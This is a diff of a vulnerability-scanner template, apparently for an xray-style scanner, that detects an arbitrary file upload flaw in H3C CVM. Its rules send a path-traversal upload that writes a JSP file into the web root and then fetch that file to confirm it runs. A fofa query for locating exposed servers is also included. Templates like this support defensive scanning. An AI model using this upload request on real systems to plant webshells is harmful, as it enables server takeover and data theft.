@@ -1,32 +1,46 @@
+expression: r0()
 id: h3c-cvm-anyfile-upload
-
 info:
-  name: H3C CVM 前台任意文件上传漏洞
   author: daffainfo
+  description: "H3C\u516C\u53F8\u4F9D\u6258\u5176\u5F3A\u5927\u7684\u6280\u672F\u5B9E\
+    \u529B\u3001\u4EA7\u54C1\u4E0E\u670D\u52A1\u4F18\u52BF\uFF0C\u4EE5\u53CA\u6DF1\
+    \u5165\u4EBA\u5FC3\u7684\u4EE5\u5BA2\u6237\u4E3A\u4E2D\u5FC3\u7684\u7406\u5FF5\
+    \uFF0C\u4E3A\u4F01\u4E1A\u6570\u636E\u4E2D\u5FC3IaaS\u4E91\u8BA1\u7B97\u57FA\u7840\
+    \u67B6\u6784\u63D0\u4F9B\u6700\u4F18\u5316\u7684\u865A\u62DF\u5316\u4E0E\u4E91\
+    \u4E1A\u52A1\u8FD0\u8425\u89E3\u51B3\u65B9\u6848\u3002\u901A\u8FC7H3CCASCVM\u865A\
+    \u62DF\u5316\u7BA1\u7406\u7CFB\u7EDF\u5B9E\u73B0\u6570\u636E\u4E2D\u5FC3\u865A\
+    \u62DF\u5316\u73AF\u5883\u7684\u4E2D\u592E\u7BA1\u7406\u63A7\u5236\uFF0C\u4EE5\
+    \u7B80\u6D01\u7684\u7BA1\u7406\u754C\u9762\uFF0C\u7EDF\u4E00\u7BA1\u7406\u6570\
+    \u636E\u4E2D\u5FC3\u5185\u6240\u6709\u7684\u7269\u7406\u8D44\u6E90\u548C\u865A\
+    \u62DF\u8D44\u6E90\uFF0C\u4E0D\u4EC5\u80FD\u63D0\u9AD8\u7BA1\u7406\u5458\u7684\
+    \u7BA1\u63A7\u80FD\u529B\u3001\u7B80\u5316\u65E5\u5E38\u4F8B\u884C\u5DE5\u4F5C\
+    \uFF0C\u66F4\u53EF\u964D\u4F4EIT\u73AF\u5883\u7684\u590D\u6742\u5EA6\u548C\u7BA1\
+    \u7406\u6210\u672C\u3002H3CCVM\u5B58\u5728\u4EFB\u610F\u6587\u4EF6\u4E0A\u4F20\
+    \u6F0F\u6D1E\uFF0C\u653B\u51FB\u8005\u53EF\u4EE5\u4E0A\u4F20\u4EFB\u610F\u6587\
+    \u4EF6\uFF0C\u83B7\u53D6webshell\uFF0C\u63A7\u5236\u670D\u52A1\u5668\u6743\u9650\
+    \uFF0C\u8BFB\u53D6\u654F\u611F\u4FE1\u606F\u7B49\u3002\nfofa-query: server=\"\
+    H3C-CVM\"\n"
+  name: "H3C CVM \u524D\u53F0\u4EFB\u610F\u6587\u4EF6\u4E0A\u4F20\u6F0F\u6D1E"
+  reference:
+  - https://mp.weixin.qq.com/s/Oqo-8D6sQltVfq2RfbQdfw
   severity: critical
   verified: false
-  description: |
-    H3C公司依托其强大的技术实力、产品与服务优势，以及深入人心的以客户为中心的理念，为企业数据中心IaaS云计算基础架构提供最优化的虚拟化与云业务运营解决方案。通过H3CCASCVM虚拟化管理系统实现数据中心虚拟化环境的中央管理控制，以简洁的管理界面，统一管理数据中心内所有的物理资源和虚拟资源，不仅能提高管理员的管控能力、简化日常例行工作，更可降低IT环境的复杂度和管理成本。H3CCVM存在任意文件上传漏洞，攻击者可以上传任意文件，获取webshell，控制服务器权限，读取敏感信息等。
-    fofa-query: server="H3C-CVM"
-  reference:
-    - https://mp.weixin.qq.com/s/Oqo-8D6sQltVfq2RfbQdfw
+rules:
+  r0:
+    expression: response.status == 200 && response.body.bcontains(b'message\')
+    request:
+      body: '<%out.print("{{r1}}");%>
 
+        '
+      method: POST
+      path: /cas/fileUpload/upload?token=/../../../../../var/lib/tomcat8/webapps/cas/js/lib/buttons/{{r1}}.jsp&name=222
+  r1:
+    expression: response.status == 200 && response.body.bcontains(bytes(r1)) && response.headers["content-type"].contains("text/html")
+    request:
+      headers:
+        Referer: '{{hosturl}}/cas/login'
+      method: GET
+      path: //cas/js/lib/buttons/{{r1}}.jsp
 set:
   hosturl: request.url
   r1: randomLowercase(20)
-rules:
-  r0:
-    request:
-      method: POST
-      path:  /cas/fileUpload/upload?token=/../../../../../var/lib/tomcat8/webapps/cas/js/lib/buttons/{{r1}}.jsp&name=222
-      body: |
-        <%out.print("{{r1}}");%>
-    expression: response.status == 200 && response.body.bcontains(b'message\')
-  r1:
-    request:
-      method: GET
-      path: //cas/js/lib/buttons/{{r1}}.jsp
-      headers:
-        Referer: "{{hosturl}}/cas/login"
-    expression: response.status == 200 && response.body.bcontains(bytes(r1)) && response.headers["content-type"].contains("text/html")
-expression: r0()
